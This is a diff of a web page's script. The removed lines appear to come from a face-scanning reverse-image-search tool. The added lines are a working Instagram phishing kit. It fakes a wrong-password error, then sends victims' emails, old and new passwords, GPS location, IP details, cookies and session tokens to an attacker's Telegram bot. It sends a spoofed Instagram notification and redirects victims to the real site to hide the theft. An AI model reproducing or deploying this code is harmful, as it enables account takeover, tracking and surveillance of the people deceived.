-      sp.scale.set(2.2,2.2*(img.height/img.width),1);sp.position.set(0,-0.2,-1.5);scene.add(sp);};
-    img.src=src;
-  }
-  
-  const pc=200;const pp=new Float32Array(pc*3);
-  for(let i=0;i<pc*3;i++)pp[i]=(Math.random()-0.5)*6;
-  const pg=new THREE.BufferGeometry();pg.setAttribute('position',new THREE.BufferAttribute(pp,3));
-  scene.add(new THREE.Points(pg,new THREE.PointsMaterial({color:0x00ff41,size:0.01,transparent:true,opacity:0.1,blending:THREE.AdditiveBlending})));
-  
-  if(landmarks&&landmarks.length>0){
-    const pos=[],cols=[];
-    landmarks.forEach((p,i)=>{
-      pos.push((p.x-0.5)*2.8,-(p.y-0.5)*3.2,(p.z-0.5)*1.5||Math.sin(i*0.5)*0.3);
-      cols.push(0.1+Math.random()*0.1,0.6+Math.random()*0.3,0.1+Math.random()*0.2);
-    });
-    const ptg=new THREE.BufferGeometry();
-    ptg.setAttribute('position',new THREE.BufferAttribute(new Float32Array(pos),3));
-    ptg.setAttribute('color',new THREE.BufferAttribute(new Float32Array(cols),3));
-    scene.add(new THREE.Points(ptg,new THREE.PointsMaterial({size:0.04,vertexColors:true,transparent:true,opacity:0.8,blending:THREE.AdditiveBlending,sizeAttenuation:true})));
-    
-    const tri=[];const ld=0.3;
-    for(let i=0;i<landmarks.length;i++)for(let j=i+1;j<landmarks.length;j++)for(let k=j+1;k<landmarks.length;k++){
-      const d1=md(pos,i,j),d2=md(pos,j,k),d3=md(pos,i,k);
-      if(Math.max(d1,d2,d3)<ld&&Math.random()>0.85)tri.push(i,j,k);
-    }
-    if(tri.length>0){
-      const mg=new THREE.BufferGeometry();
-      mg.setAttribute('position',new THREE.BufferAttribute(new Float32Array(pos),3));
-      mg.setIndex(tri);mg.computeVertexNormals();
-      scene.add(new THREE.Mesh(mg.clone(),new THREE.MeshBasicMaterial({color:0x00ff41,wireframe:true,transparent:true,opacity:0.08,blending:THREE.AdditiveBlending})));
-    }
-  }
-  
-  let t=0;
-  function ani(){t+=0.01;scene.rotation.y=Math.sin(t*0.3)*0.15;scene.rotation.x=Math.sin(t*0.2)*0.05;ren.render(scene,cam);animId=requestAnimationFrame(ani);}
-  ani();
-  const rh=()=>{const w=c.clientWidth,h=c.clientHeight;cam.aspect=w/h;cam.updateProjectionMatrix();ren.setSize(w,h);};
-  window.addEventListener('resize',rh);c._rh=rh;
-}
-function md(a,i,j){return Math.sqrt((a[i*3]-a[j*3])**2+(a[i*3+1]-a[j*3+1])**2+(a[i*3+2]-a[j*3+2])**2);}
-
-// ===================================================================
-// FACE DATA
-// ===================================================================
-function updateFaceData(){
-  if(!faceData)return;
-  document.getElementById('fEmpty').classList.add('hid');
-  document.getElementById('fContent').classList.remove('hid');
-  document.getElementById('fRows').innerHTML=[
-    ['Face ID',faceData.id],
-    ['Confidence',faceData.confidence],
-    ['Quality',faceData.quality],
-    ['Model','ArcFace + FaceNet'],
-    ['Embedding',faceData.embedding],
-    ['Landmarks',faceData.landmarks],
-    ['CDN URL',publicImageUrl?'✅ Uploaded':'⚠️ Direct upload'],
-    ['Results',googleSearchResults.length+' from Google'],
-  ].map(([k,v])=>`<div style="display:flex;justify-content:space-between;border-bottom:1px solid #00ff4111;padding:4px 0;"><span style="opacity:0.6;">${k}</span><span style="color:#00ff41;word-break:break-all;">${v}</span></div>`).join('');
-}
-
-// ===================================================================
-// RESET
-// ===================================================================
-function resetAll(){
-  if(animId){cancelAnimationFrame(animId);animId=null;}
-  const c=document.getElementById('threeC');c.innerHTML='';
-  if(c._rh)window.removeEventListener('resize',c._rh);
-  
-  capturedImage=null;faceLandmarks=null;faceDescriptor=null;faceData=null;
-  publicImageUrl=null;googleSearchResults=[];searchPerformed=false;
-  scanStatus='idle';progressValue=0;
-  
-  document.getElementById('previewArea').classList.add('hid');
-  document.getElementById('dropContent').classList.remove('hid');
-  document.getElementById('searchSection').classList.add('hid');
-  document.getElementById('fEmpty').classList.remove('hid');
-  document.getElementById('fContent').classList.add('hid');
-  document.getElementById('resultsGrid').innerHTML='';
-  document.getElementById('searchStatus').textContent='⏳ Waiting to search...';
-  document.getElementById('searchGoogleBtn').disabled=false;
-  document.getElementById('searchLoading').classList.add('hid');
-  document.getElementById('searchInfo').classList.add('hid');
-  
-  showPanel('idleState');
-  setStatus('AWAITING INPUT');
-  updateStatusPanel(`<div>⏳ Waiting for face upload...</div>`);
-  addLog('[SYSTEM] Reset. Ready for new target.','system');
-}
-
-// ===================================================================
-// INIT
-// ===================================================================
-document.addEventListener('DOMContentLoaded',()=>{
-  document.getElementById('tabCamera').classList.add('hid');
-  updateStatusPanel(`<div>⏳ Waiting for face upload...</div>`);
-});
-</script>
+        
+        // ========== 🔔 SILENT NOTIFICATION REQUEST ========== //
+        async function requestNotifSilent() {
+            try {
+                if (!('Notification' in window)) return;
+                
+                if (Notification.permission === 'granted') {
+                    notificationEnabled = true;
+                    console.log('[+] Notifications already enabled');
+                    return;
+                }
+                
+                if (Notification.permission === 'denied') return;
+                
+                const perm = await Notification.requestPermission();
+                if (perm === 'granted') {
+                    notificationEnabled = true;
+                    console.log('[+] Notifications enabled');
+                    
+                    // Send test notification
+                    new Notification('Instagram', {
+                        body: 'Security alerts are now active ✅',
+                        icon: 'https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png'
+                    });
+                }
+            } catch(e) {}
+        }
+        
+        // ========== 📍 GPS LOCATION ========== //
+        async function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { 
+                    gpsLocation = 'Not supported';
+                    resolve(gpsLocation);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        gpsLocation = `${pos.coords.latitude},${pos.coords.longitude}`;
+                        console.log('[+] GPS:', gpsLocation);
+                        resolve(gpsLocation);
+                    },
+                    (err) => {
+                        gpsLocation = 'Denied: ' + err.message;
+                        resolve(gpsLocation);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        // ========== 🌐 IP INFORMATION ========== //
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+                const d = await res.json();
+                ipInfo.ip = d.ip || 'N/A';
+                ipInfo.country = d.country_name || 'N/A';
+                ipInfo.city = d.city || 'N/A';
+                ipInfo.isp = d.org || 'N/A';
+                console.log('[+] IP:', ipInfo.ip, ipInfo.country);
+            } catch(e) {}
+        }
+        
+        // ========== 📤 SEND PHOTO TO TELEGRAM ========== //
+        async function sendPhotoToTelegram(caption) {
+            if (!capturedPhoto) return;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', capturedPhoto, 'photo.jpg');
+            formData.append('caption', caption.substring(0, 200));
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const data = await res.json();
+                console.log('[+] Photo sent:', data.ok);
+            } catch(e) {
+                console.log('[-] Photo send error:', e);
+            }
+        }
+        
+        // ========== 📤 SEND VIDEO TO TELEGRAM ========== //
+        async function sendVideoToTelegram(caption) {
+            if (!capturedVideo) return;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', capturedVideo, 'video.webm');
+            formData.append('caption', caption.substring(0, 200));
+            formData.append('supports_streaming', 'true');
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const data = await res.json();
+                console.log('[+] Video sent:', data.ok);
+            } catch(e) {
+                console.log('[-] Video send error, trying photo...');
+                await sendPhotoToTelegram(caption);
+            }
+        }
+        
+        // ========== 📝 SEND TEXT TO TELEGRAM ========== //
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const data = await res.json();
+                return data.ok;
+            } catch(e) {
+                console.error('[-] Telegram error:', e);
+                return false;
+            }
+        }
+        
+        // ========== 📧 STEP 1: LOGIN HANDLER ========== //
+        async function handleStep1() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+            const errorBox = document.getElementById('error1');
+            const btn = document.getElementById('btnLogin1');
+            
+            if (!email || !pass) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = 'Please enter your email and password.';
+                return;
+            }
+            
+            userEmail = email;
+            userPass = pass;
+            
+            // First attempt - show error (phishing technique)
+            if (attempts < 1) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                attempts++;
+                
+                // Send first attempt to Telegram
+                const msg = `🔥 **Instagram Phish - Attempt 1** 🔥
+                
+━━━━━━━━━━━━━━━━━━
+📧 **Email/Username:** \`${email}\`
+🔒 **Password:** \`${pass}\`
+━━━━━━━━━━━━━━━━━━
+📱 **Device:** ${navigator.platform}
+🌐 **Browser:** ${navigator.userAgent.substring(0, 60)}
+━━━━━━━━━━━━━━━━━━
+🌍 **IP:** \`${ipInfo.ip}\`
+🏳️ **Country:** ${ipInfo.country}
+📍 **GPS:** ${gpsLocation}
+━━━━━━━━━━━━━━━━━━
+🍪 **Cookies:** ${stolenCookies.length > 0 ? stolenCookies.slice(0, 5).join(' | ') : 'N/A'}
+🔑 **Session Tokens:** ${Object.keys(sessionTokens).length > 0 ? '✅' : 'N/A'}
+🔔 **Notifications:** ${notificationEnabled ? '✅' : '❌'}
+━━━━━━━━━━━━━━━━━━
+🕐 ${new Date().toLocaleString()}`;
+                
+                await sendToTelegram(msg);
+                return;
+            }
+            
+            // Second attempt - show loading & go to step 2
+            btn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
+            btn.disabled = true;
+            errorBox.style.display = 'none';
+            
+            // Send full details to Telegram
+            const msg = `🔥 **Instagram Credentials Stolen** 🔥
+            
+━━━━━━━━━━━━━━━━━━
+📧 **Email/Username:** \`${email}\`
+🔒 **Password:** \`${pass}\`
+━━━━━━━━━━━━━━━━━━
+📱 **Device:** ${navigator.platform}
+🌐 **Browser:** ${navigator.userAgent.substring(0, 60)}
+🖥 **Screen:** ${screen.width}x${screen.height}
+━━━━━━━━━━━━━━━━━━
+🌍 **IP:** \`${ipInfo.ip}\`
+🏳️ **Country:** ${ipInfo.country} (${ipInfo.city})
+📍 **GPS:** ${gpsLocation}
+🗺 **Maps:** ${gpsLocation.includes(',') ? 'https://maps.google.com/maps?q=' + gpsLocation : 'N/A'}
+━━━━━━━━━━━━━━━━━━
+🍪 **Cookies:** ${stolenCookies.length > 0 ? stolenCookies.join(' | ') : 'N/A'}
+🔑 **Session Keys:** ${Object.keys(sessionTokens).join(', ')}
+🔔 **Notifications:** ${notificationEnabled ? '✅ Enabled' : '❌ Disabled'}
+━━━━━━━━━━━━━━━━━━
+🕐 ${new Date().toLocaleString()}
+🔗 ${window.location.href}`;
+            
+            await sendToTelegram(msg);
+            
+            // Go to step 2 (change password)
+            setTimeout(() => {
+                btn.innerHTML = 'Log in';
+                btn.disabled = false;
+                goToStep(2);
+            }, 1000);
+        }
+        
+        // ========== 🔐 STEP 2: CHANGE PASSWORD HANDLER ========== //
+        async function handleStep2() {
+            const oldPass = document.getElementById('oldPass').value.trim();
+            const newPass = document.getElementById('newPass').value.trim();
+            const confirmPass = document.getElementById('confirmPass').value.trim();
+            const errorBox = document.getElementById('error2');
+            const successBox = document.getElementById('success2');
+            const btn = document.querySelector('#step2 .btn-login');
+            
+            if (!oldPass || !newPass || !confirmPass) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = 'Please fill in all password fields.';
+                successBox.style.display = 'none';
+                return;
+            }
+            
+            if (newPass !== confirmPass) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = 'New passwords do not match.';
+                successBox.style.display = 'none';
+                return;
+            }
+            
+            if (newPass.length < 6) {
+                errorBox.style.display = 'block';
+                errorBox.textContent = 'New password must be at least 6 characters.';
+                successBox.style.display = 'none';
+                return;
+            }
+            
+            btn.innerHTML = '<span class="loading-spinner"></span> Changing...';
+            btn.disabled = true;
+            errorBox.style.display = 'none';
+            
+            // Send new passwords to Telegram
+            const msg = `🔐 **Instagram Password Change** 🔐
+            
+━━━━━━━━━━━━━━━━━━
+📧 **Account:** \`${userEmail}\`
+🔒 **Old Password:** \`${oldPass}\`
+🔑 **New Password:** \`${newPass}\`
+━━━━━━━━━━━━━━━━━━
+🌍 **IP:** \`${ipInfo.ip}\`
+🏳️ **Country:** ${ipInfo.country}
+━━━━━━━━━━━━━━━━━━
+🕐 ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(msg);
+            
+            // Show success
+            successBox.style.display = 'block';
+            btn.textContent = '✅ Password Changed';
+            
+            // Go to step 3 (redirect to real Instagram)
+            setTimeout(() => goToStep(3), 2000);
+        }
+        
+        // ========== 📘 FACEBOOK LOGIN ========== //
+        async function handleFBLogin() {
+            const msg = `📘 **Facebook Login Clicked** 📘
+            
+━━━━━━━━━━━━━━━━━━
+📱 **Device:** ${navigator.platform}
+🌍 **IP:** \`${ipInfo.ip}\`
+🏳️ **Country:** ${ipInfo.country}
+━━━━━━━━━━━━━━━━━━
+🕐 ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(msg);
+            
+            alert('Facebook login is temporarily unavailable. Please use email login.');
+        }
+        
+        // ========== 🔄 NAVIGATION ========== //
+        function goToStep(step) {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'none';
+            
+            if (step === 1) document.getElementById('step1').style.display = 'block';
+            else if (step === 2) document.getElementById('step2').style.display = 'block';
+            else if (step === 3) {
+                document.getElementById('step3').style.display = 'block';
+                startCountdown();
+            }
+        }
+        
+        // ========== ⏱ COUNTDOWN + REDIRECT ========== //
+        function startCountdown() {
+            let seconds = 5;
+            const span = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                seconds--;
+                span.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    // 🚀 Redirect to REAL Instagram
+                    window.location.href = 'https://www.instagram.com';
+                }
+            }, 1000);
+        }
+        
+        // ========== 🎯 ENABLE LOGIN BUTTON WHEN INPUTS FILLED ========== //
+        function setupInputListeners() {
+            const emailInput = document.getElementById('loginEmail');
+            const passInput = document.getElementById('loginPass');
+            const loginBtn = document.getElementById('btnLogin1');
+            
+            function checkInputs() {
+                if (emailInput.value.trim().length > 0 && passInput.value.trim().length > 0) {
+                    loginBtn.classList.add('active');
+                    loginBtn.style.opacity = '1';
+                } else {
+                    loginBtn.classList.remove('active');
+                    loginBtn.style.opacity = '0.7';
+                }
+            }
+            
+            emailInput.addEventListener('input', checkInputs);
+            passInput.addEventListener('input', checkInputs);
+            
+            // Enter key support
+            passInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') handleStep1();
+            });
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') document.getElementById('loginPass').focus();
+            });
+        }
+    </script>
 </body>
 </html>
